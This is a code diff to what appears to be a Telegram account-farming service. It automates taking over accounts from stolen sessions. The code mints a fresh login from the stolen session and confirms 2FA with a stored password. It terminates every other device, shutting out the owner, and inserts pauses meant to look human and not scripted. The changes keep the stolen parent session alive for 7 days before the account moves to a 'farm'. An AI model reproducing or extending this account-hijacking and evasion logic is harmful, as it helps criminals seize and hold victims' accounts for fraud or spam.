@@ -1,11 +1,13 @@
 """Replace a stolen intercept session with one we issued ourselves.
 
 Order, on the same proxy:
-  1. Open the imported session.
-  2. Mint a new login (QR) and confirm it from the old client (2FA if needed).
-  3. From the old session, terminate every other device except the new one.
-  4. Only then log the old session out through itself.
-  5. Promote the new file; all further work uses that session.
+  1. Open the imported (parent) session.
+  2. Mint a new login (QR) and confirm it from the parent (2FA if needed).
+  3. From the parent, terminate every other device except the new one.
+     The parent itself stays logged in for 7 days.
+  4. Work file becomes the new session; parent file is kept in spare_*.
+  5. Both stay online 24/7. After 7 days the new session can move to farm
+     and the parent is terminated.
 
 If minting the new session fails, the old one is left untouched.
 Delays between steps look like a person checking devices, not a script.
@@ -39,7 +41,7 @@ from .session_hygiene_service import (
     _mint_spare_session,
     _spare_hash_from_authorizations,
     account_has_spare,
-    promote_spare_session,
+    install_new_keep_parent,
 )
 from .telegram_account_client import TelegramAccountClient, drop_live_for_path
 from .telegram_error_handler import SessionInvalidError, looks_like_proxy_dead
@@ -127,11 +129,28 @@ async def _drop_main_live(account: SocialAccount) -> None:
     try:
         from ...config import settings
 
-        rel = (account.session_file_path or "").strip()
-        if rel:
-            await drop_live_for_path(str(Path(settings.MEDIA_ROOT).resolve() / rel))
+        root = Path(settings.MEDIA_ROOT).resolve()
+        for rel in (
+            (account.session_file_path or "").strip(),
+            (getattr(account, "spare_session_file_path", None) or "").strip(),
+        ):
+            if rel:
+                await drop_live_for_path(str(root / rel))
     except Exception:
-        logger.debug("Could not drop live handle after intercept log_out %s", account.id, exc_info=True)
+        logger.debug("Could not drop live handles after intercept reauth %s", account.id, exc_info=True)
+
+
+async def _snapshot_known_from_new(account: SocialAccount, automation_id: int | None = None) -> None:
+    try:
+        async with TelegramAccountClient.for_account(account, automation_id=automation_id) as wrapper:
+            auths = await _list_authorizations(wrapper.client)
+        hashes = []
+        for auth in auths:
+            hashes.append(str(int(getattr(auth, "hash", 0) or 0)))
+        account.known_auth_hashes = sorted({item for item in hashes if item} | {"0"})
+        account.telegram_session_count = len(auths)
+    except Exception:
+        logger.warning("Could not snapshot intercept sessions for %s", account.id, exc_info=True)
 
 
 async def _reset_others_except_new(client, spare_hash: int | None) -> int:
@@ -180,7 +199,6 @@ async def reauth_intercept_account(
     if account_id in _busy:
         return {"status": "skipped", "reason": "in_progress"}
     _busy.add(account_id)
-    logged_out = False
     try:
         account.intercept_reauth_started_at = _utc_now()
         account.intercept_reauth_error = None
@@ -190,7 +208,7 @@ async def reauth_intercept_account(
         await _close_hub_client(automation_id, account.id)
         await _human_pause("open")
         password = load_cloud_password(account)
-        async with TelegramAccountClient.for_account(account) as old:
+        async with TelegramAccountClient.for_account(account, automation_id=automation_id) as old:
             await _human_pause("before_qr")
             spare_hash = await _mint_spare_session(
                 old,
@@ -212,34 +230,23 @@ async def reauth_intercept_account(
                 )
                 account.spare_authorization_hash = spare_hash
             await _reset_others_except_new(old.client, spare_hash)
-            await _human_pause("before_logout")
-            try:
-                await old.client.log_out()
-                logged_out = True
-            except Exception as exc:
-                logger.warning("Old intercept session log_out failed for %s: %s", account.id, exc)
 
         await _drop_main_live(account)
-        if not promote_spare_session(account):
-            if logged_out:
-                _set_error(account, INTERCEPT_ERROR_MINT, "Новая сессия есть, но файл не подменился")
-            else:
-                _set_error(account, INTERCEPT_ERROR_MINT, "Не удалось подменить файл сессии")
+        if not install_new_keep_parent(account):
+            _set_error(account, INTERCEPT_ERROR_MINT, "Не удалось подменить файл сессии, родительская не тронута")
             await session.flush()
             return {"status": "error", "reason": INTERCEPT_ERROR_MINT}
 
-        spare_device = getattr(account, "spare_telegram_device", None)
-        if isinstance(spare_device, dict) and spare_device:
-            account.telegram_device = spare_device
-        account.spare_telegram_device = None
-        account.spare_authorization_hash = None
-        account.known_auth_hashes = None
+        await _snapshot_known_from_new(account, automation_id)
         account.intercept_reauthorized_at = _utc_now()
         account.intercept_reauth_error = None
         account.intercept_reauth_started_at = None
         account.updated_at = _utc_now()
         await session.flush()
-        logger.info("Intercept account %s reauthorized onto a fresh session", account.id)
+        logger.info(
+            "Intercept account %s reauthorized; parent session kept for 7 days",
+            account.id,
+        )
         return {"status": "ok"}
     except Exception as exc:
         code, message = classify_reauth_error(exc)
